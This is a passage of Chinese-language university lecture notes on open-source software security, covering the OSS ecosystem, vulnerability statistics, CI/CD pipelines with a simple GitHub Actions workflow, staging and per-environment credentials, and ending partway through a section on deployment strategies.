# CSIT953 第 9 周 · 开源软件安全：从别人写的代码到你的服务器

> **学习目标 (Learning objectives)** — 读完本章你应该能够：
> - 说清什么是开源软件（OSS），它的生态由哪几层组成；解释现代软件为什么离不开 OSS，OSS 里的漏洞为什么"无处不在"，却不能靠改成闭源来解决；
> - 描述一次代码改动怎样走完 CI/CD 流水线（runner、单元测试、集成测试、staging、发布审批、生产），读懂一个 GitHub Actions workflow；比较 rolling、blue-green、canary 三种部署策略各自控制了什么、代价是什么；
> - 解释 CI/CD 为什么是一道安全边界：秘密怎样在运行时注入 runner，为什么"控制 CI 里跑什么代码，就是控制谁能拿到令牌"；分析不可信 PR、被攻破的 runner、第三方 CI 组件、被篡改的构建产物这四类漏洞，并给每一类配上 S32 的缓解措施；
> - 认出不安全的部署配置（默认口令、生产环境开 debug、多余的服务、以 root 运行、特权容器与 Docker socket、宽泛的卷挂载、关掉 TLS 验证），说出加固的做法；
> - 解释硬编码的秘密为什么删不掉、还会从哪些软件制品里泄露、应该放在哪里；比较 pattern、entropy、context、validation 四种秘密扫描技术，会算一个字符串的 Shannon 熵，并说出熵检测会漏掉什么、误报什么；
> - 解释撞库为什么有效；说明 passkey 怎样用"签名一个随机挑战"代替口令，为什么能防钓鱼，多设备同步怎样在云端看不到私钥的前提下工作，并把它和第 6 周的协议 9 对上；
> - 定义软件供应链和供应链攻击，用 Backstabber's Knife Collection 的攻击树给 Log4Shell、SolarWinds、typosquatting（包括 AI 幻觉出的包名）、Use After Free、event-stream、XZ Utils、Codecov 归类，并说出每个案例对应的防御。

> 📚 **材料说明** — 本笔记依据 Week 9 slides（S1–S84，"Open Source Software Security"，2026 年 9 月 22 日）和 Week 9 课程录音。本周和第 10 周是客座讲师 **Liuhuo Wan**（研究方向：网络安全、Web 与 OSS 安全、程序分析）的两次讲座；有问题可以发邮件给讲师（`liuhuow@uow.edu.au`），标题写 CSIT953（S2）。Week 9 录音完整覆盖了这份 slides，没有上一周的内容；开头几分钟是主讲老师介绍客座讲师、提醒小组项目已经发布，与课程内容无关。第 10 周的录音和 slides（"Open-Source Software Security: Static and Dynamic Analysis"）讲怎样用程序分析自动找漏洞，开头又拿本周 S51 的例子当引子，不在本笔记范围内。**页码要注意**：这份 slides 有几组"逐步展开"的页（S63–S64、S66–S68、S71–S73、S74–S76、S78–S80 各是同一页的分步显示），所以从 S64 起，右下角印的页码比 PDF 页码小，例如 S66–S68 都印着"65 / 75"。正文里的 S 编号一律是 **PDF 页码**。S1–S4、S9、S33、S44、S60 是封面、自我介绍和分节页，S83 是参考文献，S84 是 Q&A。课上 S41（危险的卷挂载）只提了一句，S42（关掉 TLS 验证）没有讲，S51（进阶秘密扫描）讲师说留到下一讲；这三页笔记按 slides 补全。S8、S17、S32、S59 的配图改成了表格；S11–S12、S19–S22、S27、S38、S40、S55–S58、S61、S70、S77 的配图重画或改画成了正文里的图 1–5、图 7–12，图 6（十个字符串的熵）是笔记新加的计算图。录音是自动转写，术语错得很多：CI/CD 成了 CICD、CSCD、CRCD、JICD，CI 成了 CF、CA、CR、CIA，runner 成了 CR render、rhino、learner，Amazon 成了 Emerson、MSN，Clang 成了 Kalon、colon，SQLite 成了 circle light，GitHub / GitLab 成了 GTA、Ghub、Jinhub、GT lab，Black Duck 成了 blackboard、black dot，PyTorch 成了 PY Touch，Maven 成了 MI，rolling 成了 ruling，canary 成了 camera、panary，load balancer 成了 node balance，Redis 成了 Relis、radis，root 成了 route，compromised 成了 compressed，mitigation 成了 meditation，least privilege 成了 list of privilege，YAML 成了 Yamu，grep 成了 grip，curl 成了 core，Stripe 成了 strap，passkey 成了 path key、PT，phishing 成了 fission，lodash 成了 Ladash，Log4j / Log4Shell 成了 log 4G、log for shale，typosquatting 成了 type of scoring，Hugging Face 成了 hugging phase，scikit-learn 成了 SK-Larn，flatmap-stream 成了 flat map，XZ Utils 成了 S the utility、XC utility、XDularity，Codecov 成了 cold cough，Bash Uploader 成了 batch upload，use after free 成了 UA free。引用时已按 slides 校正。录音里还有两处口误按 slides 改正：讲 passkey 时说成"用户把私钥上传给服务器"，实际上传的是**公钥**（S54）；讲 SolarWinds 时说成"更新发布到 Windows 商店"，slides 写的是官方更新服务器（S69）。

> 🎯 **考试提示** — 第 13 周的 slides 列出了考试范围（Exam Scope / Key Topics）。本周内容在 Applied Security Topics 下面占一条：**Software Supply Chain Security — Risks from third-party components in CI/CD pipelines**，也就是"CI/CD 流水线里第三方组件带来的风险"。对应本章的 §3（尤其是 §3.3 秘密怎样进入 runner、§3.4–§3.7 四类漏洞、§3.8–§3.9 完整性与缓解）和 §7（供应链与攻击树），复习时优先保证这两节。另外几条考试主题也用得上本章：**Authentication Protocols**（识别不安全信道上认证协议的弱点）对应 §6，passkey 就是第 6 周的协议 9；**HTTPS, TLS and Digital Certificates** 对应 §4.8 的 `verify=False`；**Virtual Machines and Containers**（隔离模型的差别）在第 11 周展开，§4.5–§4.7 的 root、特权容器和卷挂载是它的铺垫；**Secure Cloud Storage and Data Sharing** 里的访问控制，和 §5 的 API 凭据是同一件事（第 4 周 §2.7）。考试是 3 小时闭卷，单选 15 分、填空和简答 21 分、问答 14 分；slides 特别提醒，**要求解释的题，只写关键词可能拿不到满分**。放到本章，就是不要只写"用签名"，要写清签名证明了什么、证明不了什么（§3.8 和 SolarWinds）。

第 8 周 §7.2 结尾，有同学问了一个问题：开源软件本身会不会是一种风险？老师的回答是开源**总体上更安全**，因为代码公开，问题会被更多人看到、修掉；笔记在那里补了一句边界：开源让审查**成为可能**，并不保证审查**真的发生**。本周客座讲师接着这个话题往下讲，但换了一个角度。问题不再是"代码公开了安不安全"，而是：**一段别人写在 GitHub 上的代码，要经过多少环节，才变成运行在你服务器上的程序？每个环节又在信任什么？**

这条路比想象的长。代码先由开发者提交到托管平台，经过 CI/CD 流水线自动构建、测试、打包，发布到 npm、PyPI 这样的包仓库，再被成千上万个下游项目下载、配置、部署，部署时还要配上数据库口令、API key 这些秘密。下游的每一个人运行 `pip install` 的时候，都默认上游的每一环没有出问题。本章就沿着这条路走一遍，看每一环怎样被攻破、怎样防守。全章的主线是 S81 的一句话：**信任应该被持续验证，而不是被默认**（*Trust should be continuously verified, not assumed*）。

本章依次回答这些问题：

1. 什么是 OSS？现代软件为什么离不开它？它的生态由哪几层组成？（§1）
2. 一次代码改动怎样变成用户手里的软件？CI/CD 做了什么，新版本怎样稳妥地上线？（§2）
3. 为什么说 CI/CD 本身就是一道安全边界？攻击者能从哪里下手，怎样防？（§3）
4. 代码本身没有漏洞，部署出来为什么还是不安全？（§4）
5. 开发者手里的 API key、token 为什么总在泄露？怎样把它们找出来、管起来？（§5）
6. 用户的口令为什么靠不住？passkey 怎样代替它？（§6）
7. 什么是软件供应链？真实的供应链攻击是怎样发生的？（§7）

## 1. OSS 生态：现代软件建在别人的代码上

### 1.1 开源软件是什么 (S5)

S5 的定义是：**开源软件**（Open Source Software, OSS）是源代码公开、并且可以在**开源许可证**（open-source license）下被**使用、研究、修改和再分发**的软件。这个定义有两个要素。第一是四项权利：用（use）、读懂它（study）、改它（modify）、把改过或没改的版本再发出去（redistribute）。第二是许可证：这些权利是许可证明确授予的，不是"代码放在网上就随便拿"。

> 📎 **拓展(超出 slides)：源代码公开 ≠ 开源** — 有些软件把源代码放出来给人看，却不许修改或再分发，这叫"源码可见"（source-available），不算开源。常见的开源许可证有 MIT、Apache 2.0、GPL 等，区别在于再分发时附带什么条件，例如 GPL 要求修改后的版本也必须开源。许可证是法律问题，本章不展开；记住"开源 = 公开的代码 + 许可证授予的权利"就够了。

托管和协作开源项目的主要平台是 **GitHub、GitLab 和 Bitbucket**。S5 用四个特点概括了开源：

- **代码公开**（open code）：源代码任何人都能看到；
- **开放协作**（open collaboration）：任何人都可以通过 **issue**（问题报告和讨论帖）、**pull request**（简称 PR，合并请求：把自己的修改提交给项目，请维护者审查后合并）和 **patch**（补丁）参与贡献；
- **代码复用**（code reuse）：开发者可以直接复用现成的库和组件；
- **社区驱动**（community-driven）：项目由个人、社区、基金会和公司共同维护。

讲师特别强调，开源的含义**不止于代码公开**，更重要的是开放协作和代码复用；而且开源项目往往不是某个人在业余时间维护的，研究社区和大公司都在给它贡献代码。

这四个特点几乎每一个都有安全上的另一面，也就是本章后面要讲的内容。下表先把它们对上：

| 特点（S5） | 带来的好处 | 安全上的另一面 | 本章 |
|---|---|---|---|
| 代码公开 | 任何人都能审查、学习 | 攻击者也能读代码、找漏洞；已知漏洞人人可查 | §1.3 |
| 开放协作 | 全世界的人一起改进 | 陌生人也能提交 PR；攻击者可以假扮热心贡献者 | §3.4、§7.10、§7.11 |
| 代码复用 | 不必从零写起 | 复用代码，也就复用了它的漏洞 | §7.1–§7.2 |
| 社区驱动 | 不依赖某一家公司 | 关键项目可能只有一两个疲惫的志愿者在维护 | §7.11 |

### 1.2 OSS 为什么重要 (S6)

S6 的第一个数字来自 Black Duck 的 **OSSRA 2026 报告**（Open Source Security and Risk Analysis）：**98% 被审计的商业代码库里含有开源组件**。注意是"商业"代码库：即使一家公司卖的是闭源产品，产品里面也几乎一定有开源代码。第二点是：**关键的 OSS 项目被无数应用复用**。S6 的表加上讲师的解释：

| 项目 | 领域 | 用在哪里（S6） | 讲师的补充 |
|---|---|---|---|
| **Linux** | 操作系统 | Android、云、嵌入式 | Android 建立在 Linux 内核之上；Google、Amazon 的云服务器跑 Linux；树莓派这类嵌入式设备也跑 Linux。它免费，用不着付授权费 |
| **OpenSSL** | 密码学库 | HTTPS、VPN、SSH | 就在 GitHub 上，HTTPS（第 7 周）、SSH（第 5 周）这些熟悉的协议都靠它 |
| **SQLite** | 数据库 | Android、iOS、浏览器 | 一个轻量级的 SQL 数据库，因为开源，被 Android、iOS 和很多浏览器拿来存数据 |
| **zlib** | 压缩 | 操作系统、数据库 | Linux、Windows 等操作系统默认就带着它 |
| **Clang** | C/C++ 编译器前端 | C、C++、Objective-C | 你用的编译器本身也是开源组件 |
| **LLVM** | 编译器基础设施 | Clang、Rust、Swift | 一个很老的项目，Clang、Rust 和 Swift 的编译器都建在它上面 |

最后两行值得多看一眼：连**编译器**都是开源组件。编译器把源代码变成可执行程序，如果编译器本身被做了手脚，源代码再没问题，编出来的程序也可能有问题。§3.8 讲构建完整性时会回到这一点（S31 的"polluted compiler"）。

这张表要传达的是一种**集中度**：少数几个项目，被几乎所有软件间接用到。OpenSSL 出一个漏洞，就等于全世界的 HTTPS 服务器、VPN 和 SSH 一起出漏洞。§7.5 的 Log4Shell 就是这样一个例子。

### 1.3 漏洞无处不在，为什么不干脆闭源 (S7)

S7 的数字同样来自 OSSRA 2026：**87% 被审计的商业代码库含有已知的开源漏洞**；在这些代码库里，**78% 含有高危（HIGH-risk）漏洞，44% 含有严重（CRITICAL-risk）漏洞**。两个百分比会重叠，因为一个代码库可以同时含有两种。

"已知漏洞"指已经公开披露的漏洞。它们一般有一个公开的编号，叫 **CVE**（Common Vulnerabilities and Exposures），比如 §7.5 的 CVE-2021-44228。已知漏洞的危险在于**人人都查得到**：攻击者不需要自己挖漏洞，只要找到还在用旧版本的系统，照着公开的信息攻击就行。87% 这个数字说的不是"开源代码质量差"，而是**用的人没有及时升级**。

这就引出了讲师抛给全班的问题：既然开源代码里的漏洞是公开的、能被利用，**为什么不干脆改成闭源**，让谁也看不到代码？讲师用 Linux 回答。Linux 由 **Linus Torvalds 在 1991 年**发起，三十多年后成了现代计算的基础：Amazon AWS、Google Cloud、Microsoft Azure、Android、Docker 和 Kubernetes 都建在它上面。更关键的是维护方式：**Intel、AMD、NVIDIA、Google 等大公司在同一份代码上协作**。讲师举了一个例子：Google 想让自己的新产品在 Linux 上能用，做法很简单，直接把支持代码加进 Linux。假如 Linux 变成闭源，每家公司都得维护一份自己的 Linux，工作量大到不可想象。S7 的结论是：**没有哪一家公司能长期独自开发和维护 Linux 这样庞大复杂的项目**。

所以讲师的论证是**协作和成本**上的：闭源换不来安全，只会毁掉让 Linux 活下去的协作模式。这和第 8 周 §7.2 老师的论证可以合起来看。老师从 Kerckhoffs 原则出发：安全不应该押在"代码保密"上。讲师从工程现实出发：代码保密了，也就没人一起维护了。两条论证指向同一个结论：**开源是前提，问题是怎样管理开源带来的风险**。本章剩下的部分讲的都是这件事。

也要标出这个结论的边界。"开源 = 不安全"不对，"开源 = 安全"同样不对。开源让审查成为可能，可大多数人只是下载、使用，并不审查；§7.11 的 XZ Utils 更进一步，恶意部分根本不在审查者看的那份代码里。

### 1.4 OSS 生态的六层 (S8)

S8 用一张分层图展示了整个开源生态。讲师从上往下走了一遍：开发者（个人或公司）在 GitHub、GitLab 这样的平台上协作，做出 Linux、SQLite 这样的开源项目；项目必须经过测试才能确认可用，你的作业一个学期就做完了，可 Linux 已经开发了三十多年，每个组件都要保证能用，靠人工根本测不过来，所以要用 CI/CD 自动化；通过 CI/CD 之后，软件被发布到**包管理器**（package manager）：JavaScript 用 **npm**，Python 用 **PyPI**（TensorFlow、PyTorch 都从这里下载），Java 用 **Maven**，Rust 用 **Cargo**；最后，下游用户把这些库用进云服务、手机应用和嵌入式系统。

下表按 S8 的六层排列，最后两列标出了本章在这一层讲的风险：

| 层（S8） | 例子（S8） | 这一层的风险 | 本章 |
|---|---|---|---|
| 开发者与组织 Developers & Organizations | 个人、公司、大学、社区 | 维护者被社会工程、账号被盗 | §7.10、§7.11 |
| 代码托管与协作 Code Hosting & Collaboration | GitHub、GitLab | 恶意 PR；误提交进仓库的秘密 | §3.4、§5.2 |
| OSS 项目 OSS Projects | Linux、LLVM、Apache、SQLite | 已知漏洞没有及时修补 | §1.3、§7.5 |
| CI/CD 与自动化 CI/CD & Automation | GitHub Actions、GitLab CI | 被攻破的 runner、恶意的第三方 Action、被篡改的产物 | §3 |
| 包仓库与制品 Package Registries & Artifacts | npm、PyPI、Maven、Cargo | typosquatting、抢注、投毒的新版本 | §7.8–§7.10 |
| 下游用户 Downstream Users | 云服务、手机应用、应用程序、企业系统 | 错误配置、泄露的秘密、撞库 | §4–§6 |

这张表也是本章的地图。注意每一层都**信任它上面的那一层**：下游用户信任包仓库里的包就是开发者发布的那个，包仓库信任上传者就是维护者本人，维护者信任 CI/CD 产出的就是源代码编译出来的东西。攻击者要做的，就是在某一层把这种信任变成漏洞。

<details>
<summary>自测：一家公司说"我们只买闭源的商业软件，所以开源漏洞和我们无关"。用 S6、S7 的数据和 §1.4 的生态反驳这句话。</summary>

S6 说 98% 被审计的**商业**代码库含有开源组件，S7 说 87% 的商业代码库含有已知开源漏洞。闭源产品里面照样有 OpenSSL、zlib、SQLite 这类组件，只是从外面看不见。更糟的是，用闭源产品的公司没法自己检查或修补这些组件，只能等厂商升级。按 §1.4 的生态，这家公司处在"下游用户"那一层，上面每一层出的问题都会传到它这里。

</details>

<details>
<summary>自测：讲师为什么认为不能靠把 Linux 改成闭源来解决漏洞问题？这个论证和第 8 周老师的论证有什么不同？</summary>

讲师的论证是协作和成本上的：Linux 由 Intel、AMD、NVIDIA、Google 等公司在同一份代码上共同维护，改成闭源，每家公司都得维护自己的版本，没有哪家公司能独自维护这样庞大的项目（S7）。第 8 周老师的论证是原理上的（Kerckhoffs 原则）：安全应该押在密钥上，而不是押在设计保密上，开源让更多人能发现并修补问题。两者结论一致：开源是前提，要做的是管理风险。

</details>

## 2. CI/CD：把代码变成软件的流水线

§1.4 的生态里，CI/CD 处在正中间：上面接着开发者提交的源代码，下面接着包仓库和下游用户。要看懂它为什么会成为攻击目标（§3），先得看懂它平时在做什么。

### 2.1 GitHub、CI 与 CD (S10)

S10 先给了 GitHub 的规模（数据来自 GitHub 的 Octoverse 2025 报告）：**超过 3.95 亿个公开仓库，服务全球 1.8 亿多名开发者**。全世界的开发者通过 pull request、代码审查（code review）和 issue 跟踪在上面协作；GitHub 还集成了自动化的 CI/CD 流水线，用来做测试和安全分析。讲师补充说，可以把 GitLab 看成"工业级的 GitHub"，GitHub 和 GitLab 都内置了 CI/CD。

> 📎 **拓展(超出 slides)：几个 Git 名词** — slides 默认你用过 Git，这里补上本章会反复用到的几个词。**仓库**（repository）是一个项目的全部代码和全部历史。**提交**（commit）是一次带说明的改动快照，每个 commit 有一个由内容算出的哈希值作为 ID，并且记录它的上一个 commit 的哈希，所以 Git 的历史是一条哈希链，和第 2 周 §1.5 区块链里"每个区块承诺前一个区块"是同一个结构（§5.2 会用到这一点）。**分支**（branch）是一条独立的开发线，`main`（老项目叫 `master`）是主分支。**fork**（复刻）是把别人的仓库复制一份到自己名下。陌生人想给项目贡献代码，通常是先 fork，在自己的副本里改，再发一个 **pull request** 请原项目的维护者审查；维护者同意后，把改动**合并**（merge）进主分支。

S10 给出了 CI/CD 的定义。CI/CD 是 **Continuous Integration / Continuous Deployment** 的缩写：

- **CI（持续集成，Continuous Integration）**：开发者频繁地把代码改动合并进共享仓库；**每一次改动都自动构建、自动测试**，以便尽早发现问题。
- **CD（持续部署，Continuous Deployment）**：代码通过 CI 之后，**自动**准备发布，或者直接部署到生产环境。

S10 列出的好处是：交付更快、测试自动化、部署结果一致、缺陷发现得早、反馈快。讲师结合开源协作解释了两者的分工：一个开源项目有很多人在改，每当有人想把新功能、新改动合并进仓库，CI 流水线就会运行，检查新加的函数能不能正常工作；通过 CI 说明代码功能正常，接着由 CD 自动准备发布，把软件部署到生产环境给用户用。

> 📎 **拓展(超出 slides)：CD 的两种意思** — 业界的 CD 有两个说法。**Continuous Delivery**（持续交付）指软件随时处在可以发布的状态，但最后一步"发布到生产"由人来批准；**Continuous Deployment**（持续部署）指通过所有检查后自动上线，中间没有人工环节。slides 用的是 Deployment，可 S14、S16 的流程里都有一步"发布审批"（release approval），更接近 Delivery。考试按 slides 的写法即可，知道这个区别能帮你读懂别的资料。

### 2.2 一次提交走过的路 (S11, S12)

S11 用一张流水线图展示了 CI/CD 的全貌。S12 顶部先画了一条最简短的链：**推送到 main → 启动 CI runner → 安装依赖 → 运行测试 → 部署到生产**；下面把它展开成了六步：

1. 开发者提交代码（commit），或者提交一个 pull request；
2. 代码仓库（例如 GitHub 或 GitLab）**自动触发**一个 CI **workflow**（工作流）；
3. CI 流水线构建项目，运行自动化测试；
4. 所有检查都通过，就生成一个**可部署的制品**（deployable artifact）；
5. CD 流水线把这个制品部署到 staging 或生产环境；
6. 持续的监控和反馈，指导下一轮开发。

图 1 把 S11 的配图和这六步合在一起重画了。

```d2 图 1 · CI/CD 流水线（按 S11、S12 重画）：一次提交自动触发 CI，在 runner 上构建、跑单元测试和集成测试；全部通过才产出可部署的制品，交给 CD 审查、进 staging、上生产；生产环境的监控又引出下一轮改动
direction: down
dev: "开发者 commit 或提交 PR"
ci: "CI 流水线：在 runner 上运行" {
  grid-columns: 3
  b: "① 构建\n安装依赖"
  u: "② 单元测试\n一次测一个函数"
  i: "③ 集成测试\n多个函数一起处理请求"
}
art: "可部署的制品 artifact" {class: key}
cd: "CD 流水线" {
  grid-columns: 3
  r: "① 代码审查"
  s: "② staging\n模拟生产的预演"
  p: "③ 生产 production\n真实用户"
}
mon: "持续监控与反馈"
dev -> ci: 自动触发
ci -> art: 全部通过
art -> cd
cd -> mon
mon -> dev: 下一轮改动
```

讲师沿着图 1 解释了每个环节：

- **runner**（运行器）：平台为这次 CI 任务准备的执行环境，可以是一台 Ubuntu 机器，也可以是 Windows 机器。CI 的所有步骤都在 runner 上执行。这个词在 §3 里会变得很重要。
- **构建**（build）：CI 先安装项目需要的依赖（dependencies），把项目构建出来。
- **单元测试**（unit test）：一次只测一个函数，确认它单独工作时没问题。
- **集成测试**（integration test）：测多个函数一起工作的情况。一个 HTTP 请求进来，会依次流经好几个函数；集成测试**模拟**（mock）一个用户请求，看这些函数合在一起能不能正确处理它。
- **代码审查**（review）：发布到生产之前，由项目维护者或协作者审查代码，确认它足够安全。
- **staging**：可以理解为**预生产环境**（pre-production）。生产环境是给用户用的，staging 则模拟生产环境，模拟数据库连接、模拟网络，看软件在上线前能不能正常运行。在 staging 发现问题，就修好再走一轮 CI/CD。
- **生产**（production）：一切正常后，部署到生产环境给用户用。

### 2.3 为什么需要 CI (S13)

S13 的第一句话是本节的定义：**CI 自动检查一次新的代码改动能不能被安全地集成进来；它把集成从一个手工的、容易出错的过程，变成一个自动化的质量与安全检查点**（*an automated quality and security checkpoint*）。S13 画的检查链是：新的代码改动 → 单元测试 → 安全扫描 → 安装依赖 → 在目标环境里运行。

S13 的两栏可以逐条配对：

| CI 检查什么（S13 左栏） | 为什么重要（S13 右栏） |
|---|---|
| 新函数能不能用？ | 在合并之前发现 bug（find bugs before merge） |
| 原有的测试还能不能通过？ | 尽早发现被改坏的构建（catch broken builds early） |
| 有没有明显的安全问题？ | 让测试可以重复执行（make testing repeatable） |
| 依赖能不能正确安装？ | 减轻人工审查的负担（reduce manual review burden） |
| 软件能不能在目标环境里启动？ | （同上） |

讲师把 CI 的目的归结为两条。第一，确认**新加的功能**能正常工作。第二，确认**原有的功能没有被改坏**：一个开源项目里已经有很多功能，新贡献者的改动不能让它们出问题。除此之外，还可以在 CI 里加安全任务，比如检查代码里有没有误写进去的密钥（§5.5）；CI 要构建项目，所以也能顺便检查依赖装不装得上、软件能不能在 Linux、Windows 这些目标环境里启动。讲师说，个人作业、小组项目手工测试没问题，可一个巨大的项目靠人工测试是不可能的。

课上有同学问：**手工和自动到底差在哪里？** 讲师的回答是：手工测试时，你自己看需求有没有满足；自动测试时，**每一次有人提交改动，新提交的代码和原有的代码都会自动跑一遍 CI**，你只要把代码提交上去，平台替你做检查。你还可以写自己的检查规则，比如写一条规则，检查整个仓库的源代码里有没有出现你的名字或学号。同学总结得很准确：规则要人来定，CI 负责每次自动执行。

### 2.4 读懂一个 CI workflow (S15)

在 GitHub 上，CI 的规则写在仓库里的一个 YAML 文件中（放在 `.github/workflows/` 目录下），这个文件就是 **workflow**。S15 逐行解释了一个例子。slides 第 2 行误写成了 `[push]:`，正确的写法是 `push:`，下面按正确写法列出：

```yaml
on:
  push:
    branches:
      - main
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      # Reuse an existing GitHub Action --- third-party actions
      - uses: actions/checkout@v4
      # Execute commands directly on the runner --- shell command
      - name: Install dependencies
        run: npm install
      - name: Run tests
        run: npm test
      - name: Code analysis
        run: ./analyze.sh
```

逐行看：

- `on: push` 加上 `branches: main`：**触发条件**。每当有代码推送（push）到 `main` 分支，就运行这个 workflow。`main` 可以换成别的分支，比如 developer、stable。
- `jobs`：一个 workflow 由若干 **job**（任务）组成，每个 job 又由若干 **step**（步骤）组成。这里只有一个 job，名叫 `pipeline`。
- `runs-on: ubuntu-latest`：**启动一台全新的 Linux runner** 来执行这个 job。也可以指定 Windows 或 macOS。
- `uses: actions/checkout@v4`：**复用一个现成的 GitHub Action**，也就是别人写好的一段 CI 步骤。`actions/checkout` 的作用是把仓库代码**下载到 runner 里**，`@v4` 是版本标签。
- `run: npm install`：直接在 runner 上执行 shell 命令，**安装第三方依赖**。
- `run: npm test`：运行项目的测试套件。测试代码本来就写在源代码里，CI 只负责执行。
- `run: ./analyze.sh`：运行一个自定义的分析脚本，检查代码质量。分析发现问题就报错，这次运行失败，开发者根据报告去改代码。

S15 底部的总结是：**一条 CI 流水线把一次代码改动自动变成经过测试、可以部署的软件**。

课上围绕 checkout 有两个问题。一位同学问："我们本来就在 main 分支上，checkout 是要切到别的分支吗？"讲师解释，`on` 那几行**不是说我们在 main 上**，而是说"每当 main 上发生 push 事件，就运行下面的流程"。runner 是一台空的新机器，上面本来没有代码，checkout 把触发这次运行的那份代码取下来。另一位同学问 checkout 到底是什么。讲师说，它就像你在代码里 `import` PyTorch 或 TensorFlow 一样，是别人写好的第三方组件，拿来就用；你也可以不用它，自己写脚本，那样更灵活。（`actions/` 下的官方 Action 由 GitHub 维护，GitHub 属于 Microsoft，所以讲师说它是"Microsoft 开发的"。）

这里先埋一个伏笔。这个 workflow 里有两种步骤：`uses:` 运行的是**别人写的代码**（第三方 Action），`run:` 运行的是**仓库里的脚本和命令**。两种都在同一台 runner 上、以同样的权限执行。`npm install` 还会顺带执行依赖包自带的安装脚本，那也是别人写的代码。§3 的四类漏洞，本质上都是攻击者设法让自己的代码出现在这两种步骤里。

### 2.5 为什么需要 CD：staging 和发布审批 (S14, S16)

S14 给 CD 下的定义是：**CD 把发布变成一个受控的、可重复的、可审计的过程，而不是一次临时的手工操作**。它画的流程是：CI 通过、构建完成 → 打包制品 → 部署到 staging → 发布审批 → 部署到生产。两栏同样可以配对：

| CD 自动化了什么（S14 左栏） | 为什么重要（S14 右栏） |
|---|---|
| 构建并打包发布用的制品 | 减少手工部署出错 |
| 部署到 staging 或生产环境 | 让发布可以重复 |
| 套用各环境专属的配置 | 让生产和 staging 保持一致 |
| 部署后运行冒烟测试 | 更快地交付补丁 |
| 部署失败时回滚 | 为每次发布留下审计日志 |

这里有两个新词。**制品**（artifact）是构建的产物，可能是一个可执行文件、一个压缩包、一个容器镜像，或者一个要发布到 npm 的包。**回滚**（roll back）是新版本出问题时退回旧版本。

既然 CI 已经测过了，为什么还要 staging？S16 的第一句话回答了这个问题：**CI 通过只说明代码在测试用的 runner 里能工作，不说明它在生产环境里也能工作**。S16 的流程是：开发（本地测试）→ CI（构建 + 测试）→ staging（类生产环境的测试）→ 审批（发布关卡）→ 生产（真实用户）。两者检查的东西不同：

| CI 检查什么（S16） | staging 检查什么（S16） |
|---|---|
| 单元测试 | 真实的配置 |
| 构建是否正确 | 数据库连接 |
| 依赖能否安装 | 网络规则 |
| 安全扫描 | 冒烟测试 |

S16 的总结是：**staging 是生产的彩排**，检验那个已经通过验证的制品能不能真的在类生产环境里跑起来。讲师的解释是：复杂的开源软件不只是一堆函数，它要连服务器上的数据库，要监听 HTTP 请求；CI 只能检查函数对不对，检查不了软件在真实环境里能不能正常运行。staging 模拟生产环境，打开数据库、打开网络，再看一遍。

讲师还解释了**冒烟测试**（smoke test）：软件部署好之后，先测最基本的功能。比如一个购物网站上线了，先打开首页看能不能显示，登录一下，点一件商品，看能不能加进购物车。最基本的路走不通，就没必要往下测了。

> 📎 **拓展(超出 slides)：冒烟测试这个名字** — 它来自硬件行业：新电路板第一次通电，先看会不会冒烟，不冒烟再做细致的测试。

### 2.6 三个环境，三套凭据 (S17)

S17 的原则只有一句：**不同的环境应该有不同的凭据、权限、数据和网络访问**。S17 的表：

| | CI | CD | 生产 Production |
|---|---|---|---|
| 用途 Purpose | 构建 / 测试 | 部署 | 服务用户 |
| 数据 Data | 测试数据 | staging 数据 | 真实数据 |
| 秘密 Secrets | 测试用 token | 部署用 token | 生产环境的秘密 |
| 权限 Permissions | 有限 | 部署权限 | 严格限制 |
| 网络 Network | 有限 | 能访问部署目标 | 生产网络 |
| 使用者 Users | 开发者 | operators | 真实用户 |

表下面还画了一条界线：**普通的 CI job**（构建、测试、扫描）**只能拿到测试用的凭据**；**生产部署 job** 运行在一个**受保护的环境**（protected environment）里，**审批通过之后**才能拿到生产环境的秘密；从普通 CI job 指向生产秘密的那条虚线，写着"不应访问"（should not access）。

讲师强调的正是这条隔离：**CI job 永远不应该拿到 CD job 或生产环境的秘密**，否则会非常危险，§3 会看到具体的攻击。原因可以从 CI 的触发方式推出来。CI 在每一次提交、每一个 PR 上运行，而 PR 可能来自任何一个陌生人。CI job 能碰到的东西，陌生人的代码就有可能碰到，所以 CI 只配测试用的 token。生产的秘密只交给满足两个条件的 job：跑的是可信的代码（主分支上审查过的代码），并且经过了人工审批。这是第 4 周 §5.2 **最小权限**（least privilege）原则在流水线上的应用。

> 📎 **拓展(超出 slides)：GitHub 的 environments** — GitHub Actions 里有一个叫 environment 的功能，正好实现 S17 的界线：你可以给"production"环境单独存放秘密，并设置"必须由某几个人批准"；只有声明部署到这个环境、并且得到批准的 job，平台才会把这些秘密注入进去。

课上有同学问表里的 **operators** 是谁。讲师的解释是：operator 指**模拟真实用户操作的人或程序**，大多是脚本，比如自动点击网页上的按钮、填写表单、把商品加进购物车，用预先定义好的测试检查功能；它们不是真实用户。

> 📎 **拓展(超出 slides)：operators 的另一种常见含义** — 在 DevOps 的说法里，operators 通常指**运维人员**（DevOps 里的"Ops"），也就是负责部署、保证系统正常运行的人。两种理解都不影响这一行的要点：CD 环境由做部署的人和脚本接触，不面对真实用户和真实数据。

### 2.7 部署策略：控制新版本暴露给多少人 (S18–S22)

CI 产出了一个验证过的制品，CD 接下来要决定一件事（S18）：**这个新版本怎样到达用户手里？** S18 说，CD 不只是运行一下 `deploy.sh`。最朴素的做法是立即替换：

> v1 正在运行 → 停掉 v1 → 部署 v2 → 启动 v2

问题是：**如果 v2 有问题，所有用户会同时受影响**。S18 的回答是：**部署策略通过控制新版本在什么时候、在哪里、向多少人暴露，来降低发布风险**。讲师说，你做小组作业时就是这样做的：版本 1 能用，加了新功能变成版本 2，就停掉 1、启动 2。简单的任务可以这样做，可 Amazon 的购物网站显然不能。

**第一种：滚动部署**（rolling deployment，S19）。**逐步替换旧实例，而不是一次更新整个系统**。S19 的表用三台服务器演示：

| 时刻 | Server 1 | Server 2 | Server 3 |
|---|---|---|---|
| T1 | v1 | v1 | v1 |
| T2 | **v2** | v1 | v1 |
| T3 | v2 | **v2** | v1 |
| T4 | v2 | v2 | **v2** |

